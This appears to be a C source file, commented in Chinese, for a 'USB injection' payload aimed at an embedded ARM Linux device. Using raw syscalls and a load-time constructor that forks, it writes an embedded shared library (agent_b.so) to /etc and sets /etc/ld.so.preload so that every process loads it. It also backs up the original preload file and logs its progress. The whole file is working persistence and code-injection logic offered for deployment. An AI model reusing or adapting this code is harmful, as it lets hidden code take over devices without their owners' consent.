/* payload_deploy_b.c —— 通过 USB 注入部署方案 B。
 *
 * 做三件事：
 *   ① 备份原 /etc/ld.so.preload 到 SD
 *   ② 把内嵌的 agent_b.so 写到 /etc/agent_b.so
 *   ③ /etc/ld.so.preload = "/etc/agent_b.so"
 *
 * 为什么放 /etc：
 *   /etc 和 /tmp 共用 nflasha10，可写，且 init 会挂载它。
 *   放 /etc 比 /log 更早可用。
 */
#define SYS_exit 1
#define SYS_fork 2
#define SYS_read 3
#define SYS_write 4
#define SYS_open 5
#define SYS_close 6
#define SYS_unlink 10
#define SYS_mount 21
#define SYS_umount2 52
#define SYS_mkdir 39
#define SYS_fsync 118
#define SYS_sync 36
#define SYS_nanosleep 162
#define SYS_lseek 19

static inline int sy0(int n){register int r7 __asm__("r7")=n;register int r0 __asm__("r0");__asm__ volatile("svc #0":"=r"(r0):"r"(r7):"memory","cc");return r0;}
static inline int sy1(int n,int a){register int r7 __asm__("r7")=n;register int r0 __asm__("r0")=a;__asm__ volatile("svc #0":"+r"(r0):"r"(r7):"memory","cc");return r0;}
static inline int sy2(int n,int a,int b){register int r7 __asm__("r7")=n;register int r0 __asm__("r0")=a;register int r1 __asm__("r1")=b;__asm__ volatile("svc #0":"+r"(r0):"r"(r7),"r"(r1):"memory","cc");return r0;}
static inline int sy3(int n,int a,int b,int c){register int r7 __asm__("r7")=n;register int r0 __asm__("r0")=a;register int r1 __asm__("r1")=b;register int r2 __asm__("r2")=c;__asm__ volatile("svc #0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2):"memory","cc");return r0;}
static inline int sy5(int n,int a,int b,int c,int d,int e){register int r7 __asm__("r7")=n;register int r0 __asm__("r0")=a;register int r1 __asm__("r1")=b;register int r2 __asm__("r2")=c;register int r3 __asm__("r3")=d;register int r4 __asm__("r4")=e;__asm__ volatile("svc #0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4):"memory","cc");return r0;}

static char B[8192]; static int L;
static void s(const char*x){while(*x&&L<8000)B[L++]=*x++;}
static void iv(int v){char t[12];int n=0;if(v<0){B[L++]='-';v=-v;}if(!v){B[L++]='0';return;}while(v&&n<11){t[n++]='0'+(v%10);v/=10;}while(n)B[L++]=t[--n];}
static void nl(void){B[L++]='\n';}
static int sl(const char*p){int n=0;while(p[n])n++;return n;}

static int wf(const char*p,const char*d,int n){
    int fd=sy3(SYS_open,(int)p,0x241,0644);
    if(fd<0)return fd;
    int o=0;
    while(o<n){int r=sy3(SYS_write,fd,(int)(d+o),n-o);if(r<=0)break;o+=r;}
    sy1(SYS_fsync,fd);sy1(SYS_close,fd);
    return o;
}
static int ex(const char*p){int fd=sy3(SYS_open,(int)p,0,0);if(fd<0)return 0;sy1(SYS_close,fd);return 1;}

/* 内嵌 agent_b.so */
#include "agent_b_blob.h"

__attribute__((constructor)) static void entry(void)
{
    int p=sy0(SYS_fork);
    if(p==0){
        s("=== DEPLOY B ===\n");

        /* ① 备份原 preload 内容 */
        s("--- 原 /etc/ld.so.preload ---\n");
        int fd=sy3(SYS_open,(int)"/etc/ld.so.preload",0,0);
        if(fd>=0){
            char b[512]; int n=sy3(SYS_read,fd,(int)b,500); sy1(SYS_close,fd);
            b[n>0?n:0]=0;
            s("  存在, "); iv(n); s(" B: [");
            for(int i=0;i<n&&i<200;i++){char c=b[i];B[L++]=(c>=32&&c<127)?c:0x2e;}
            s("]\n");
        } else {
            s("  不存在\n");
        }
        nl();

        /* ② 写 agent_b.so 到 /etc */
        s("--- 写 /etc/agent_b.so ---\n");
        s("  大小: "); iv(agent_b_len); nl();
        int w = wf("/etc/agent_b.so", (const char*)agent_b_blob, agent_b_len);
        s("  写入: "); iv(w); nl();
        s("  存在: "); iv(ex("/etc/agent_b.so")); nl();
        nl();

        /* ③ 写 /etc/ld.so.preload */
        s("--- 写 /etc/ld.so.preload ---\n");
        const char *PL = "/etc/agent_b.so";
        int w2 = wf("/etc/ld.so.preload", PL, sl(PL));
        s("  写入: "); iv(w2); s(" 内容: "); s(PL); nl();

        /* 回读验证 */
        fd=sy3(SYS_open,(int)"/etc/ld.so.preload",0,0);
        if(fd>=0){
            char b[128]; int n=sy3(SYS_read,fd,(int)b,120); sy1(SYS_close,fd);
            b[n>0?n:0]=0;
            s("  回读: [");  for(int i=0;i<n;i++){char c=b[i];B[L++]=(c>=32&&c<127)?c:0x2e;} s("]\n");
        }
        nl();

        /* ④ 同步 */
        sy1(SYS_sync,0);
        s("=== 完成，sync 已执行 ===\n");

        wf("/setting/deploy_b.txt", B, L);
        wf("/log/deploy_b.txt", B, L);
        sy1(SYS_exit,0);
        for(;;){}
    }
}
